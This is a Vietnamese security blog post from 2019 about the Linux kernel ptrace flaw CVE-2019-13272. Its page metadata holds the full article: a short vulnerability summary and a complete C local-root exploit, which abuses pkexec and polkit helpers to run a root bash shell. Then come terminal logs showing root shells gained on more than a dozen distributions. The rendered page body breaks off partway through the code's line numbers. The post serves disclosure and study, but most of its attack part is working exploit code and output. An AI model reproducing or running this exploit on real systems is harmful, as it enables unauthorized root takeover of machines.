<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux | minhtuanact|Blog - Keep a flame in the rain!</title><meta name=keywords content="CyberSecurity,Linux,CVE,Kernel,root privileges"><meta name=description content="Mở đầu  Ngày hôm qua, 1 thành viên trong đội của tôi đã gửi cho tôi 1 bài post trên facebook nói về con CVE-2019-13272 này. Sau một hồi tìm hiểu thì con CVE này cực kì nghiêm trọng. Nó có thể chiếm quyền root máy của bạn chỉ sau đúng một nốt nhạc. Bài viết này chỉ mang tính giới thiệu, bạn nào muốn tìm hiểu về cách thức hoạt động của con CVE-2019-13272 thì bạn có thể tìm hiểu trên mạng nhé ^^."><meta name=author content="minhtuanact"><link rel=canonical href=https://minhtuanact.github.io/posts/linux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux/><meta name=google-site-verification content="minhtuanact"><meta name=yandex-verification content="minhtuanact"><meta name=msvalidate.01 content="minhtuanact"><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=16x16 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=32x32 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=apple-touch-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=mask-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux"><meta property="og:description" content="Mở đầu  Ngày hôm qua, 1 thành viên trong đội của tôi đã gửi cho tôi 1 bài post trên facebook nói về con CVE-2019-13272 này. Sau một hồi tìm hiểu thì con CVE này cực kì nghiêm trọng. Nó có thể chiếm quyền root máy của bạn chỉ sau đúng một nốt nhạc. Bài viết này chỉ mang tính giới thiệu, bạn nào muốn tìm hiểu về cách thức hoạt động của con CVE-2019-13272 thì bạn có thể tìm hiểu trên mạng nhé ^^."><meta property="og:type" content="article"><meta property="og:url" content="https://minhtuanact.github.io/posts/linux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux/"><meta property="og:image" content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-07-26T09:08:58+07:00"><meta property="article:modified_time" content="2019-07-26T09:08:58+07:00"><meta property="og:site_name" content="minhtuanact|Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux"><meta name=twitter:description content="Mở đầu  Ngày hôm qua, 1 thành viên trong đội của tôi đã gửi cho tôi 1 bài post trên facebook nói về con CVE-2019-13272 này. Sau một hồi tìm hiểu thì con CVE này cực kì nghiêm trọng. Nó có thể chiếm quyền root máy của bạn chỉ sau đúng một nốt nhạc. Bài viết này chỉ mang tính giới thiệu, bạn nào muốn tìm hiểu về cách thức hoạt động của con CVE-2019-13272 thì bạn có thể tìm hiểu trên mạng nhé ^^."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://minhtuanact.github.io/posts/"},{"@type":"ListItem","position":2,"name":"Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux","item":"https://minhtuanact.github.io/posts/linux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux","name":"Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux","description":"Mở đầu  Ngày hôm qua, 1 thành viên trong đội của tôi đã gửi cho tôi 1 bài post trên facebook nói về con CVE-2019-13272 này. Sau một hồi tìm hiểu thì con CVE này cực kì nghiêm trọng. Nó có thể chiếm quyền root máy của bạn chỉ sau đúng một nốt nhạc. Bài viết này chỉ mang tính giới thiệu, bạn nào muốn tìm hiểu về cách thức hoạt động của con CVE-2019-13272 thì bạn có thể tìm hiểu trên mạng nhé ^^.","keywords":["CyberSecurity","Linux","CVE","Kernel","root privileges"],"articleBody":"Mở đầu  Ngày hôm qua, 1 thành viên trong đội của tôi đã gửi cho tôi 1 bài post trên facebook nói về con CVE-2019-13272 này. Sau một hồi tìm hiểu thì con CVE này cực kì nghiêm trọng. Nó có thể chiếm quyền root máy của bạn chỉ sau đúng một nốt nhạc. Bài viết này chỉ mang tính giới thiệu, bạn nào muốn tìm hiểu về cách thức hoạt động của con CVE-2019-13272 thì bạn có thể tìm hiểu trên mạng nhé ^^.  CVE-2019-13272  Trạng thái: Mới Tên: CVE-2019-13272 Thành phần: Dễ bị tổn thương Phần cứng: Tất cả Hệ điều hành: Linux Ưu tiên: Cao Mức độ nghiêm trọng: Cao Tác giả: Laura Pardo Báo cáo: 2019-07-17 20:06 UTC Đã được sửa trong phiên bản: Kernel 5.1.17   Trích nguyên văn của Laura Pardo\n1  Laura Pardo 2019-07-17 20:06:24 UTC    A flaw in the kernels implementation of ptrace which could inadvertantly grant elevated permissions to an attacker who could abuse the relationship between tracer and the process being traced.\nThe mechanism used to link the process requesting the ptrace and the process being ptraced could allow a local user to obtain root level priviledges by creating an opportunity to abuse the frequently used pattern of dropping privileges and then execve a child with reduced privileges/permissions.\n PoC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209  #define _GNU_SOURCE #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include #include  #define SAFE(expr) ({ \\ typeof(expr) __res = (expr); \\ if (__res == -1) err(1, \"%s\", #expr); \\ __res; \\ }) #define max(a,b) ((a)(b) ? (a) : (b))  static int middle_success = 1; static int block_pipe[2]; static int self_fd = -1; static int dummy_status; static const char *helper_path; const char *helpers[] = { \"/usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper\", }; /* temporary printf; returned pointer is valid until next tprintf */ static char *tprintf(char *fmt, ...) { static char buf[10000]; va_list ap; va_start(ap, fmt); vsprintf(buf, fmt, ap); va_end(ap); return buf; } static int middle_main(void *dummy) { prctl(PR_SET_PDEATHSIG, SIGKILL); pid_t middle = getpid(); self_fd = SAFE(open(\"/proc/self/exe\", O_RDONLY)); pid_t child = SAFE(fork()); if (child == 0) { prctl(PR_SET_PDEATHSIG, SIGKILL); SAFE(dup2(self_fd, 42)); /* spin until our parent becomes privileged (have to be fast here) */ int proc_fd = SAFE(open(tprintf(\"/proc/%d/status\", middle), O_RDONLY)); char *needle = tprintf(\"\\nUid:\\t%d\\t0\\t\", getuid()); while (1) { char buf[1000]; ssize_t buflen = SAFE(pread(proc_fd, buf, sizeof(buf)-1, 0)); buf[buflen] = '\\0'; if (strstr(buf, needle)) break; } /* * this is where the bug is triggered. * while our parent is in the middle of pkexec, we force it to become our * tracer, with pkexec's creds as ptracer_cred. */ SAFE(ptrace(PTRACE_TRACEME, 0, NULL, NULL)); /* * now we execute passwd. because the ptrace relationship is considered to * be privileged, this is a proper suid execution despite the attached * tracer, not a degraded one. * at the end of execve(), this process receives a SIGTRAP from ptrace. */ puts(\"executing passwd\"); execl(\"/usr/bin/passwd\", \"passwd\", NULL); err(1, \"execl passwd\"); } SAFE(dup2(self_fd, 0)); SAFE(dup2(block_pipe[1], 1)); struct passwd *pw = getpwuid(getuid()); if (pw == NULL) err(1, \"getpwuid\"); middle_success = 1; execl(\"/usr/bin/pkexec\", \"pkexec\", \"--user\", pw-pw_name, helper_path, \"--help\", NULL); middle_success = 0; err(1, \"execl pkexec\"); } static void force_exec_and_wait(pid_t pid, int exec_fd, char *arg0) { struct user_regs_struct regs; struct iovec iov = { .iov_base = \u0026regs, .iov_len = sizeof(regs) }; SAFE(ptrace(PTRACE_SYSCALL, pid, 0, NULL)); SAFE(waitpid(pid, \u0026dummy_status, 0)); SAFE(ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, \u0026iov)); /* set up indirect arguments */ unsigned long scratch_area = (regs.rsp - 0x1000) \u0026 ~0xfffUL; struct injected_page { unsigned long argv[2]; unsigned long envv[1]; char arg0[8]; char path[1]; } ipage = { .argv = { scratch_area + offsetof(struct injected_page, arg0) } }; strcpy(ipage.arg0, arg0); for (int i = 0; i  sizeof(ipage)/sizeof(long); i++) { unsigned long pdata = ((unsigned long *)\u0026ipage)[i]; SAFE(ptrace(PTRACE_POKETEXT, pid, scratch_area + i * sizeof(long), (void*)pdata)); } /* execveat(exec_fd, path, argv, envv, flags) */ regs.orig_rax = __NR_execveat; regs.rdi = exec_fd; regs.rsi = scratch_area + offsetof(struct injected_page, path); regs.rdx = scratch_area + offsetof(struct injected_page, argv); regs.r10 = scratch_area + offsetof(struct injected_page, envv); regs.r8 = AT_EMPTY_PATH; SAFE(ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, \u0026iov)); SAFE(ptrace(PTRACE_DETACH, pid, 0, NULL)); SAFE(waitpid(pid, \u0026dummy_status, 0)); } static int middle_stage2(void) { /* our child is hanging in signal delivery from execve()'s SIGTRAP */ pid_t child = SAFE(waitpid(-1, \u0026dummy_status, 0)); force_exec_and_wait(child, 42, \"stage3\"); return 0; } static int spawn_shell(void) { SAFE(setresgid(0, 0, 0)); SAFE(setresuid(0, 0, 0)); execlp(\"bash\", \"bash\", NULL); err(1, \"execlp\"); } int main(int argc, char **argv) { if (strcmp(argv[0], \"stage2\") == 0) return middle_stage2(); if (strcmp(argv[0], \"stage3\") == 0) return spawn_shell(); for (int i=0; isizeof(helpers)/sizeof(helpers[0]); i++) { struct stat st; if (stat(helpers[i], \u0026st) == 0) { helper_path = helpers[i]; break; } } if (helper_path == NULL) errx(1, \"no known helper found, add a helper with yes from /usr/share/polkit-1/actions to `helpers`\"); /* * set up a pipe such that the next write to it will block: packet mode, * limited to one packet */ SAFE(pipe2(block_pipe, O_CLOEXEC|O_DIRECT)); SAFE(fcntl(block_pipe[0], F_SETPIPE_SZ, 0x1000)); char dummy = 0; SAFE(write(block_pipe[1], \u0026dummy, 1)); /* spawn pkexec in a child, and continue here once our child is in execve() */ static char middle_stack[1024*1024]; pid_t midpid = SAFE(clone(middle_main, middle_stack+sizeof(middle_stack), CLONE_VM|CLONE_VFORK|SIGCHLD, NULL)); if (!middle_success) return 1; /* * wait for our child to go through both execve() calls (first pkexec, then * the executable permitted by polkit policy). */ while (1) { int fd = open(tprintf(\"/proc/%d/comm\", midpid), O_RDONLY); char buf[16]; int buflen = SAFE(read(fd, buf, sizeof(buf)-1)); buf[buflen] = '\\0'; *strchrnul(buf, '\\n') = '\\0'; if (strncmp(buf, basename(helper_path), 15) == 0) break; usleep(100000); } /* * our child should have gone through both the privileged execve() and the * following execve() here */ SAFE(ptrace(PTRACE_ATTACH, midpid, 0, NULL)); SAFE(waitpid(midpid, \u0026dummy_status, 0)); fputs(\"attached to midpid\\n\", stderr); force_exec_and_wait(midpid, 0, \"stage2\"); return 0; }   Kết quả Debian Debian 10 (xfce) 1  /usr/lib/gnome-settings-daemon/gsd-backlight-helper   1 2 3 4 5 6  user@debian-10-0-0-x64:~/Desktop/47133$ ./a.out executing passwd attached to midpid root@debian-10-0-0-x64:/home/user/Desktop/47133# id uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner),1000(user) root@debian-10-0-0-x64:/home/user/Desktop/47133#   Debian 9.4 (xfce) 1  /usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper   1 2 3 4 5  user@debian9-4-0-x64:~/Desktop/47133$ ./a.out executing passwd attached to midpid root@debian9-4-0-x64:/home/user/Desktop/47133# id uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(lpadmin),117(scanner),1000(user)   Devuan 2.0.0 (xfce) 1  /usr/lib/x86_64-linux-gnu/xfce4/session/xfsm-shutdown-helper   1 2 3 4  user@devuan-2-0-0:~/Desktop/47133$ ./a.out executing passwd attached to midpid root@devuan-2-0-0:/home/user/Desktop/47133#   SparkyLinux 5 (lxqt) 1  /usr/bin/lxqt-backlight_backend   1 2 3 4 5 6  user@sparkylinux-5-x64:~/47133$ ./a.out executing passwd attached to midpid root@sparkylinux-5-x64:/home/user/47133# id uid=0(root) gid=0(root) groups=0(root),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),104(scanner),107(lpadmin),113(netdev),114(bluetooth),1000(user) root@sparkylinux-5-x64:/home/user/47133#   Ubuntu UbuntuUbuntu 16.04.5 (unity) 1  /usr/lib/unity-settings-daemon/usd-backlight-helper   1 2 3 4 5 6 7 8 9 10 11 12 13 14  user@ubuntu-16-04-5-x64:~/Desktop/kernel-exploits/CVE-2019-13272$ ./a.out Linux 4.10 local root (CVE-2019-13272) [.] Checking environment ... [~] Done, looks good [.] Searching for known helpers ... [~] Found known helper: /usr/lib/unity-settings-daemon/usd-backlight-helper [~] Using helper: /usr/lib/unity-settings-daemon/usd-backlight-helper [.] Spawning suid process (/usr/bin/pkexec) ... [.] Tracing midpid ... [~] Attached to midpid To run a command as administrator (user \"root\"), use \"sudo \". See \"man sudo_root\" for details. root@ubuntu-16-04-5-x64:/home/user/Desktop/kernel-exploits/CVE-2019-13272#   Ubuntu 18.04 (gnome) 1  /usr/lib/gnome-settings-daemon/gsd-backlight-helper   1 2 3 4 5 6 7  user@ubuntu:~/Desktop/47133$ ./a.out executing passwd attached to midpid To run a command as administrator (user \"root\"), use \"sudo \". See \"man sudo_root\" for details. root@ubuntu:/home/user/Desktop/47133#   Ubuntu 19.04 (gnome) 1  /usr/lib/gnome-settings-daemon/gsd-backlight-helper   1 2 3 4 5 6 7  user@ubuntu-19-04-x64:~/Desktop/47133$ ./a.out executing passwd attached to midpid To run a command as administrator (user \"root\"), use \"sudo \". See \"man sudo_root\" for details. root@ubuntu-19-04-x64:/home/user/Desktop/47133#   Ubuntu Mate 19.04 (mate) 1  /usr/sbin/mate-power-backlight-helper   1 2 3 4 5 6 7  user@ubuntu-mate-19-04-desktop-amd64:~/Desktop/47133$ ./a.out executing passwd attached to midpid To run a command as administrator (user \"root\"), use \"sudo \". See \"man sudo_root\" for details. root@ubuntu-mate-19-04-desktop-amd64:/home/user/Desktop/47133#   Linux Mint 19-v2 (mate) 1  /usr/sbin/mate-power-backlight-helper   1 2 3 4 5 6 7 8 9  user@linux-mint-19-2:~/Desktop/47133$ ./a.out executing passwd attached to midpid To run a command as administrator (user \"root\"), use \"sudo \". See \"man sudo_root\" for details. root@linux-mint-19-2:/home/user/Desktop/47133# id uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),128(sambashare),1000(user) root@linux-mint-19-2:/home/user/Desktop/47133#   Elementary OS 0.4.1 (gnome) 1  /usr/lib/gnome-settings-daemon/gsd-backlight-helper   1 2 3 4 5 6 7  user@elementary-os-0-4-1-20170517:~/47133$ ./a.out executing passwd attached to midpid To run a command as administrator (user \"root\"), use \"sudo \". See \"man sudo_root\" for details. root@elementary-os-0-4-1-20170517:/home/user/47133# exit   Fedora / CentOS / RHEL Fedora 30 Workstation (gnome) 1 2  /usr/libexec/gsd-wacom-led-helper /usr/libexec/gsd-wacom-oled-helper   1 2 3 4 5 6 7 8 9 10 11  [user@localhost CVE-2019-13272]$ ./a.out Linux 4.10 local root (CVE-2019-13272) [.] Checking environment ... [~] Done, looks good [.] Searching for known helpers ... [~] Found known helper: /usr/libexec/gsd-wacom-led-helper [.] Spawning pkexec ... [.] Tracing midpid ... [~] Attached to midpid [root@localhost CVE-2019-13272]# id uid=0(root) gid=0(root) groups=0(root),10(wheel),1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023   Arch Manjaro 18.0.3 (xfce) 1  /usr/bin/xfpm-power-backlight-helper   1 2 3 4  [user@manjaro-xfce-18-0-3-x86-64 47133]$ ./a.out executing passwd attached to midpid [manjaro-xfce-18-0-3-x86-64 47133]#    Mageia 6 (gnome) 1  /usr/libexec/gsd-backlight-helper   1 2 3 4  [user@localhost 47133]$ ./a.out executing passwd attached to midpid [root@localhost 47133]#   Antergos 18.7 (gnome) Antergos was recently EOL (last release 2019-04-04)\n1 2  /usr/lib/gsd-wacom-oled-helper /usr/lib/gsd-backlight-helper   1 2 3 4 5 6  [user@antergos 47133]$ ./a.out executing passwd attached to midpid [root@antergos 47133]# id uid=0(root) gid=0(root) groups=0(root),985(users),998(wheel) [root@antergos 47133]# exit   Tài liệu tham khảo https://bugs.chromium.org/p/project-zero/issues/detail?id=1903 https://github.com/rapid7/metasploit-framework/issues/12104 https://0day.life/exploit/0day-636.html\n","wordCount":"1663","inLanguage":"en","datePublished":"2019-07-26T09:08:58+07:00","dateModified":"2019-07-26T09:08:58+07:00","author":{"@type":"Person","name":"minhtuanact"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://minhtuanact.github.io/posts/linux-broken-permission-and-object-lifetime-handling-for-ptrace-traceme-chiem-quyen-root-hau-het-cac-may-chay-linux/"},"publisher":{"@type":"Organization","name":"minhtuanact|Blog - Keep a flame in the rain!","logo":{"@type":"ImageObject","url":"https://minhtuanact.github.io/cat-icon-png-3.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://minhtuanact.github.io/ accesskey=h title="minhtuanact|Blog (Alt + H)"><img src=https://minhtuanact.github.io/cat-icon-png-3.png alt aria-label=logo height=35>minhtuanact|Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://minhtuanact.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://minhtuanact.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://minhtuanact.github.io/wedding title=wedding><span>wedding</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://minhtuanact.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://minhtuanact.github.io/posts/>Posts</a></div><h1 class=post-title>Linux: broken permission and object lifetime handling for PTRACE_TRACEME - Chiếm quyền root hầu hết các máy chạy Linux</h1><div class=post-meta><span title="2019-07-26 09:08:58 +0700 +0700">July 26, 2019</span>&nbsp;·&nbsp;8 min&nbsp;·&nbsp;minhtuanact</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#m%e1%bb%9f-%c4%91%e1%ba%a7u aria-label="Mở đầu">Mở đầu</a></li><li><a href=#cve-2019-13272 aria-label=CVE-2019-13272>CVE-2019-13272</a></li><li><a href=#poc aria-label=PoC>PoC</a><ul><li><a href=#k%e1%ba%bft-qu%e1%ba%a3 aria-label="Kết quả">Kết quả</a></li><li><a href=#debian aria-label=Debian>Debian</a><ul><li><a href=#debian-10-xfce aria-label="Debian 10 (xfce)">Debian 10 (xfce)</a></li><li><a href=#debian-94-xfce aria-label="Debian 9.4 (xfce)">Debian 9.4 (xfce)</a></li><li><a href=#devuan-200-xfce aria-label="Devuan 2.0.0 (xfce)">Devuan 2.0.0 (xfce)</a></li><li><a href=#sparkylinux-5-lxqt aria-label="SparkyLinux 5 (lxqt)">SparkyLinux 5 (lxqt)</a></li></ul></li><li><a href=#ubuntu aria-label=Ubuntu>Ubuntu</a><ul><li><a href=#ubuntuubuntu-16045-unity aria-label="UbuntuUbuntu 16.04.5 (unity)">UbuntuUbuntu 16.04.5 (unity)</a></li><li><a href=#ubuntu-1804-gnome aria-label="Ubuntu 18.04 (gnome)">Ubuntu 18.04 (gnome)</a></li><li><a href=#ubuntu-1904-gnome aria-label="Ubuntu 19.04 (gnome)">Ubuntu 19.04 (gnome)</a></li><li><a href=#ubuntu-mate-1904-mate aria-label="Ubuntu Mate 19.04 (mate)">Ubuntu Mate 19.04 (mate)</a></li><li><a href=#linux-mint-19-v2-mate aria-label="Linux Mint 19-v2 (mate)">Linux Mint 19-v2 (mate)</a></li><li><a href=#elementary-os-041-gnome aria-label="Elementary OS 0.4.1 (gnome)">Elementary OS 0.4.1 (gnome)</a></li></ul></li><li><a href=#fedora--centos--rhel aria-label="Fedora / CentOS / RHEL">Fedora / CentOS / RHEL</a><ul><li><a href=#fedora-30-workstation-gnome aria-label="Fedora 30 Workstation (gnome)">Fedora 30 Workstation (gnome)</a></li></ul></li><li><a href=#arch aria-label=Arch>Arch</a><ul><li><a href=#manjaro-1803-xfce aria-label="Manjaro 18.0.3 (xfce)">Manjaro 18.0.3 (xfce)</a></li><li><a href=#mageia-6-gnome aria-label="Mageia 6 (gnome)">Mageia 6 (gnome)</a></li><li><a href=#antergos-187-gnome aria-label="Antergos 18.7 (gnome)">Antergos 18.7 (gnome)</a></li></ul></li></ul></li><li><a href=#t%c3%a0i-li%e1%bb%87u-tham-kh%e1%ba%a3o aria-label="Tài liệu tham khảo">Tài liệu tham khảo</a></li></ul></div></details></div><div class=post-content><h2 id=mở-đầu>Mở đầu<a hidden class=anchor aria-hidden=true href=#mở-đầu>#</a></h2><ul><li>Ngày hôm qua, 1 thành viên trong đội của tôi đã gửi cho tôi 1 bài post trên facebook nói về con <strong>CVE-2019-13272</strong> này. Sau một hồi tìm hiểu thì con CVE này cực kì nghiêm trọng. Nó có thể chiếm quyền root máy của bạn chỉ sau đúng một nốt nhạc. Bài viết này chỉ mang tính giới thiệu, bạn nào muốn tìm hiểu về cách thức hoạt động của con <strong>CVE-2019-13272</strong> thì bạn có thể tìm hiểu trên mạng nhé ^^.</li></ul><h2 id=cve-2019-13272>CVE-2019-13272<a hidden class=anchor aria-hidden=true href=#cve-2019-13272>#</a></h2><ul><li>Trạng thái: Mới</li><li>Tên: CVE-2019-13272</li><li>Thành phần: Dễ bị tổn thương</li><li>Phần cứng: Tất cả</li><li>Hệ điều hành: Linux</li><li>Ưu tiên: Cao</li><li>Mức độ nghiêm trọng: Cao</li><li>Tác giả: Laura Pardo</li><li>Báo cáo: 2019-07-17 20:06 UTC</li><li>Đã được sửa trong phiên bản: Kernel 5.1.17</li></ul><hr><p><em>Trích nguyên văn của Laura Pardo</em></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Laura Pardo 2019-07-17 20:06:24 UTC
</span></span></code></pre></td></tr></table></div></div><blockquote><p>A flaw in the kernels implementation of ptrace which could inadvertantly grant elevated permissions to an attacker who could abuse the relationship between tracer and the process being traced.</p><p>The mechanism used to link the process requesting the ptrace and the process being ptraced could allow a local user to obtain root level priviledges by creating an opportunity to abuse the frequently used pattern of dropping privileges and then execve a child with reduced privileges/permissions.</p></blockquote><h2 id=poc>PoC<a hidden class=anchor aria-hidden=true href=#poc>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
